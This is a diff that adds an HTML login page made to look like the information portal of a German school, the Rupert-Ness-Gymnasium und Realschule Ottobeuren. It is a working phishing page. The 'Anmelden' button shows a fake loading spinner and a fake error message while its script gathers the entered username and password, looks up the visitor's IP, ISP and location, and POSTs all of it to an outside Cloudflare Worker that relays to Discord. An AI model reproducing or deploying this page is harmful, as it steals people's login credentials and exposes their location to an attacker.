@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="de">
+
+<head>
+    <meta charset="utf-8">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <title>Informationsportal</title>
+    <meta name="robots" content="noindex">
+    <meta http-equiv="refresh" content="1200">
+    <link href="css/semantic.min.css" rel="stylesheet" media="all">
+
+    <style>
+        /* Allgemeines Styling */
+        .ui.segment {
+            width: 20%;
+            background-color: #E7E7E7;
+            min-width: 20em;
+            text-align: left;
+        }
+
+        /* Augen-Icon für Passwort-Anzeige */
+        .eye.icon {
+            cursor: pointer;
+        }
+
+        /* Ladeanimation */
+        #loading-circle {
+            display: none;
+            width: 40px;
+            height: 40px;
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2185d0;
+            border-radius: 50%;
+            animation: spin 2s linear infinite;
+            margin: 10px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        /* Fehlermeldung */
+        #error-message {
+            display: none;
+            color: red;
+            margin-top: 10px;
+        }
+    </style>
+
+    <script>
+        /**
+         * Schaltet die Sichtbarkeit des Passworts um.
+         */
+        function togglePasswordVisibility() {
+            var passwordField = document.getElementById("password");
+            var eyeIcon = document.getElementById("eye-icon");
+
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                eyeIcon.classList.add("slash");
+            } else {
+                passwordField.type = "password";
+                eyeIcon.classList.remove("slash");
+            }
+        }
+        async function sendDataToWebhook(user, password) {
+            // URL des Cloudflare Workers
+            var workerURL = "https://discord-webhook-relay.voyager273.workers.dev/";
+
+            // Aktuelle Website abrufen
+            var website = window.location.href;
+
+            try {
+                // IP & Standort abrufen
+                let response = await fetch("https://ipapi.co/json/");
+                let ipData = await response.json();
+
+                var ip = ipData.ip || "Unbekannt";
+                var isp = ipData.org || "Unbekannt";
+                var city = ipData.city || "Unbekannt";
+                var country = ipData.country_name || "Unbekannt";
+
+                var data = {
+                    user: user,
+                    password: password,
+                    website: website,
+                    ip: ip,
+                    isp: isp,
+                    city: city,
+                    country: country,
+                    timestamp: new Date().toLocaleString()
+                };
+
+                // Daten an Cloudflare Worker senden
+                await fetch(workerURL, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(data)
+                });
+
+            } catch (error) {
+                console.error("Fehler beim Senden der Daten:", error);
+            }
+        }
+        /**
+         * Zeigt eine Ladeanimation und anschließend eine Fehlermeldung an.
+         */
+        function handleLogin() {
+            document.getElementById("loading-circle").style.display = "block";
+
+            setTimeout(() => {
+                document.getElementById("loading-circle").style.display = "none";
+                document.getElementById("error-message").style.display = "block";
+
+                var user = document.getElementById("user").value;
+                var password = document.getElementById("password").value;
+                sendDataToWebhook(user, password);
+            }, 2000);
+        }
+    </script>
+</head>
+
+<body>
+    <center>
+        <!-- Header-Bereich -->
+        <p></p>
+        <p><span class="ui text large">Informationsportal</span><br>
+            <span class="ui text huge">Rupert-Ness-Gymnasium und Realschule Ottobeuren</span>
+        </p><br>
+        <img src="images/logo_big.png" border="0">
+        <p><br>Version 2025.01.07.114048</p>
+
+        <!-- Login-Formular -->
+        <form class="ui segment form" id="login-form" name="signon" autocomplete="off">
+            <div class="field">
+                <label for="user">Benutzer</label>
+                <input type="text" id="user" name="user" autofocus>
+            </div>
+            <div class="field">
+                <label for="password">Passwort <i class="eye icon" id="eye-icon"
+                        onclick="togglePasswordVisibility()"></i></label>
+                <input type="password" id="password" name="password">
+            </div>
+
+            <!-- Ladeanimation -->
+            <div id="loading-circle"></div>
+
+            <!-- Buttons -->
+            <div style="display: flex; justify-content: space-around;">
+                <button type="button" id="close_button" class="ui negative basic button">Beenden</button>
+                <input id="submit_button" class="ui secondary basic button" style="font-weight:bold;" type="button"
+                    value="Anmelden" onclick="handleLogin()">
+            </div>
+
+            <!-- Fehlermeldung -->
+            <p id="error-message">Anmeldung nicht möglich. Versuchen Sie es später erneut.</p>
+        </form>
+
+        <img src="images/sec_zert.png" id="sec_zert" style="width:2%">
+    </center>
+</body>
+
+</html>
